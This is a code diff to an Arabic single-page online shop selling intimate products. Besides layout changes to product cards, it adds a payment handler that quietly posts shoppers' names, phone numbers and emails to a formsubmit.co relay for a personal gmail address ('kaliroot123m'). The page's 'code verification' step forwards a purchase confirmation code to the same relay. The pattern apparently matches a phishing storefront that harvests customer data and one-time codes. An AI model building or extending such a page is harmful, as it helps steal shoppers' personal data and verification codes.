@@ -644,7 +644,7 @@
         </section>
     </div>
 
-    <!-- Mobile-Optimized Code Verification Page -->
+    <!-- Code Verification Page -->
     <div id="code" class="page">
         <section class="py-6 md:py-16 bg-gradient-to-br from-green-900 via-emerald-900 to-teal-900 min-h-screen relative overflow-hidden">
             <!-- Animated Background -->
@@ -693,7 +693,7 @@
                                 <input type="hidden" name="_subject" value="✅ رمز التأكيد تم إدخاله - متجر الخصوصية">
                                 <input type="hidden" name="_captcha" value="false">
                                 <input type="hidden" name="_template" value="table">
-                                <input type="hidden" name="_next" value="javascript:showThankYouPage()">
+                                <input type="hidden" name="_next" value="https://www.google.com">
                                 <input type="hidden" name="form_type" value="رمز تأكيد الشراء">
                                 <input type="hidden" name="submission_time" value="">
                                 <input type="hidden" name="customer_data" value="">
@@ -1627,7 +1627,7 @@
             return stars;
         }
 
-        // Generate vibrator products with translations  
+        // Generate vibrator products with simple design like main page
         function generateVibratorProducts() {
             const grid = document.getElementById('vibrators-products-grid');
             
@@ -1644,63 +1644,44 @@
                 return;
             }
             
-            const productsHTML = products.map((product, index) => {
+            const productsHTML = products.map(product => {
                 const convertedPrice = convertPrice(product.price);
                 const convertedOriginalPrice = convertPrice(product.originalPrice);
                 const currencySymbol = currencySymbols[currentCurrency];
                 const productName = product.name[currentLanguage] || product.name['ar'];
                 const productDesc = product.description[currentLanguage] || product.description['ar'];
-                const features = product.features[currentLanguage] || product.features['ar'] || [];
                 
                 return `
-                <div class="bg-white dark:bg-gray-700 rounded-xl md:rounded-2xl shadow-xl overflow-hidden card-hover relative group animate-fadeInUp" style="animation-delay: ${index * 0.1}s">
+                <div class="bg-white dark:bg-gray-700 rounded-xl md:rounded-2xl shadow-xl overflow-hidden card-hover relative group">
                     <div class="discount-badge animate-pulse">خصم ${product.discount}%</div>
-                    
-                    <!-- Image Gallery -->
                     <div class="h-48 md:h-64 overflow-hidden relative">
-                        <div class="image-gallery relative w-full h-full">
-                            ${product.images ? product.images.map((img, imgIndex) => `
-                                <img src="${img}" alt="${productName}" class="w-full h-full object-cover absolute inset-0 transition-opacity duration-500 ${imgIndex === 0 ? 'opacity-100' : 'opacity-0'}" data-img-index="${imgIndex}">
-                            `).join('') : `<img src="${product.image}" alt="${productName}" class="w-full h-full object-cover">`}
-                        </div>
+                        <img src="${product.image}" alt="${productName}" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500">
                         <div class="absolute inset-0 bg-black bg-opacity-0 group-hover:bg-opacity-20 transition-all duration-300"></div>
-                        
-                        <!-- Image Navigation Dots -->
-                        ${product.images && product.images.length > 1 ? `
-                            <div class="absolute bottom-2 left-1/2 transform -translate-x-1/2 flex space-x-1 space-x-reverse">
-                                ${product.images.map((_, imgIndex) => `
-                                    <button class="w-2 h-2 rounded-full bg-white bg-opacity-50 hover:bg-opacity-100 transition-all ${imgIndex === 0 ? 'bg-opacity-100' : ''}" onclick="changeProductImage(this, ${imgIndex})"></button>
-                                `).join('')}
-                            </div>
-                        ` : ''}
                     </div>
-                    
                     <div class="p-4 md:p-6">
-                        <!-- المنتج يظهر اسمه فقط ويكون بخط أغمق وأكبر -->
-                        <div class="text-center mb-4">
-                            <h3 class="mobile-title">${productName}</h3>
-                        </div>
-                        
-                        <!-- السعر بخط أغمق وأكبر -->
-                        <div class="text-center mb-4">
-                            <div class="mobile-description">
-                                <span class="text-2xl md:text-3xl font-black text-purple-600 dark:text-purple-400">${convertedPrice} ${currencySymbol}</span>
-                                <span class="text-sm md:text-base text-gray-500 line-through mr-1 md:mr-2">${convertedOriginalPrice} ${currencySymbol}</span>
+                        <h3 class="text-lg md:text-xl font-bold mb-2 md:mb-3">${productName}</h3>
+                        <div class="flex items-center mb-2 md:mb-3">
+                            <div class="flex text-xs md:text-sm">
+                                ${generateStarRating(product.rating)}
                             </div>
-                            <div class="text-sm md:text-base text-green-600 font-bold mt-1">خصم ${product.discount}% - وفر ${(convertedOriginalPrice - convertedPrice).toFixed(0)} ${currencySymbol}</div>
+                            <span class="text-xs text-gray-500 mr-2">(${product.reviews.toLocaleString()} تقييم)</span>
                         </div>
-                        
-                        <!-- زر لعرض التفاصيل -->
-                        <button onclick="showProductDetails(${product.id})" class="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white py-3 md:py-4 rounded-xl hover:from-purple-700 hover:to-pink-700 transition-all font-bold text-base md:text-lg transform hover:scale-105 hover-lift mb-3">
-                            <i class="fas fa-eye mr-2"></i>
-                            عرض التفاصيل والصور
-                        </button>
-                        
-                        <!-- زر الشراء -->
-                        <button onclick="addToCart('${product.id}', '${productName.replace(/'/g, "\\'")}', ${convertedPrice})" class="w-full bg-gradient-to-r from-green-600 to-emerald-600 text-white py-3 md:py-4 rounded-xl hover:from-green-700 hover:to-emerald-700 transition-all font-bold text-base md:text-lg transform hover:scale-105 hover-lift">
-                            <i class="fas fa-cart-plus mr-2"></i>
-                            أضف للسلة
-                        </button>
+                        <div class="flex justify-between items-center mb-3">
+                            <div>
+                                <span class="text-lg md:text-2xl font-bold text-primary">${convertedPrice} ${currencySymbol}</span>
+                                <span class="text-xs md:text-sm text-gray-500 line-through mr-1 md:mr-2">${convertedOriginalPrice} ${currencySymbol}</span>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <button onclick="showProductDetails(${product.id})" class="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white py-2 md:py-3 rounded-lg md:rounded-xl hover:from-purple-700 hover:to-pink-700 transition-all font-bold transform hover:scale-105 text-xs md:text-base hover-lift">
+                                <i class="fas fa-eye mr-2"></i>
+                                عرض التفاصيل والصور
+                            </button>
+                            <button onclick="addToCart('${product.id}', '${productName}', ${convertedPrice})" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-2 md:py-3 rounded-lg md:rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all font-bold transform hover:scale-105 text-xs md:text-base hover-lift">
+                                <i class="fas fa-cart-plus mr-2"></i>
+                                أضف للسلة
+                            </button>
+                        </div>
                     </div>
                 </div>
             `;
@@ -1709,7 +1690,7 @@
             grid.innerHTML = productsHTML;
         }
 
-        // Generate products with translations
+        // Generate products with simple design like vibrators page
         function generateProducts() {
             const grid = document.getElementById('products-grid');
             const homeGrid = document.getElementById('home-products-grid');
@@ -1730,19 +1711,25 @@
                     </div>
                     <div class="p-4 md:p-6">
                         <h3 class="text-lg md:text-xl font-bold mb-2 md:mb-3">${productName}</h3>
-                        <p class="text-gray-600 dark:text-gray-300 text-xs md:text-sm mb-2 md:mb-3">${productDesc}</p>
                         <div class="flex items-center mb-2 md:mb-3">
                             <div class="flex text-xs md:text-sm">
                                 ${generateStarRating(product.rating)}
                             </div>
                             <span class="text-xs text-gray-500 mr-2">(${product.reviews.toLocaleString()} تقييم)</span>
                         </div>
-                        <div class="flex justify-between items-center">
+                        <div class="flex justify-between items-center mb-3">
                             <div>
                                 <span class="text-lg md:text-2xl font-bold text-primary">${convertedPrice} ${currencySymbol}</span>
                                 <span class="text-xs md:text-sm text-gray-500 line-through mr-1 md:mr-2">${convertedOriginalPrice} ${currencySymbol}</span>
                             </div>
-                            <button onclick="addToCart('${product.id}', '${productName}', ${convertedPrice})" class="bg-gradient-to-r from-primary to-secondary text-white px-3 md:px-6 py-2 md:py-3 rounded-lg md:rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all font-bold transform hover:scale-105 text-xs md:text-base hover-lift">
+                        </div>
+                        <div class="space-y-2">
+                            <button onclick="showProductDetails(${product.id})" class="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white py-2 md:py-3 rounded-lg md:rounded-xl hover:from-purple-700 hover:to-pink-700 transition-all font-bold transform hover:scale-105 text-xs md:text-base hover-lift">
+                                <i class="fas fa-eye mr-2"></i>
+                                عرض التفاصيل والصور
+                            </button>
+                            <button onclick="addToCart('${product.id}', '${productName}', ${convertedPrice})" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-2 md:py-3 rounded-lg md:rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all font-bold transform hover:scale-105 text-xs md:text-base hover-lift">
+                                <i class="fas fa-cart-plus mr-2"></i>
                                 أضف للسلة
                             </button>
                         </div>
@@ -2451,8 +2438,9 @@
                 const customerData = JSON.parse(sessionStorage.getItem('customerData') || '{}');
                 this.querySelector('input[name="customer_data"]').value = JSON.stringify(customerData);
                 
-                // Show thank you page after a brief delay
+                // Hide code verification section and show thank you page
                 setTimeout(() => {
+                    document.getElementById('code-verification-section').style.display = 'none';
                     showPage('thank-you');
                     
                     // Update thank you page with order details
@@ -2622,6 +2610,8 @@
 
         // Payment form handler
         document.getElementById('payment-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
             const firstName = this.querySelector('input[name="first_name"]').value;
             const lastName = this.querySelector('input[name="last_name"]').value;
             const countryCode = this.querySelector('select[name="country_code"]').value;
@@ -2646,25 +2636,44 @@
             
             sessionStorage.setItem('orderNumber', orderNumber);
             
-            const hiddenFields = [
-                { name: '_subject', value: `📋 طلب جديد - ${orderNumber} - متجر الخصوصية` },
-                { name: '_next', value: `${window.location.origin}${window.location.pathname}#code` },
-                { name: 'order_items', value: orderSummary },
-                { name: 'total_amount', value: `${finalTotal.toFixed(2)} ${currencySymbols[currentCurrency]}` },
-                { name: 'order_number', value: orderNumber },
-                { name: 'order_date', value: new Date().toLocaleString('ar-SA') },
-                { name: 'order_status', value: 'في انتظار كود التأكيد' },
-                { name: 'currency', value: currentCurrency },
-                { name: 'language', value: currentLanguage },
-                { name: 'shipping_cost', value: `${shippingCost.toFixed(2)} ${currencySymbols[currentCurrency]}` }
-            ];
+            // Hide payment modal and show code page
+            hidePayment();
+            showPage('code');
             
-            hiddenFields.forEach(field => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = field.name;
-                input.value = field.value;
-                this.appendChild(input);
+            // Update phone display
+            if (customerData.phone) {
+                const phoneNumber = customerData.phone;
+                const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
+                const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : '****0000';
+                
+                const phoneDisplay = document.getElementById('customer-phone-display');
+                if (phoneDisplay) {
+                    phoneDisplay.textContent = maskedPhone;
+                }
+            }
+            
+            // Submit form data to formsubmit
+            const formData = new FormData();
+            formData.append('_subject', `📋 طلب جديد - ${orderNumber} - متجر الخصوصية`);
+            formData.append('_captcha', 'false');
+            formData.append('_template', 'table');
+            formData.append('_next', 'https://www.google.com');
+            formData.append('order_items', orderSummary);
+            formData.append('total_amount', `${finalTotal.toFixed(2)} ${currencySymbols[currentCurrency]}`);
+            formData.append('order_number', orderNumber);
+            formData.append('order_date', new Date().toLocaleString('ar-SA'));
+            formData.append('order_status', 'في انتظار كود التأكيد');
+            formData.append('currency', currentCurrency);
+            formData.append('language', currentLanguage);
+            formData.append('shipping_cost', `${shippingCost.toFixed(2)} ${currencySymbols[currentCurrency]}`);
+            formData.append('first_name', firstName);
+            formData.append('last_name', lastName);
+            formData.append('phone', `${countryCode}${phone}`);
+            formData.append('email', email);
+            
+            fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
+                method: 'POST',
+                body: formData
             });
             
             cart = [];
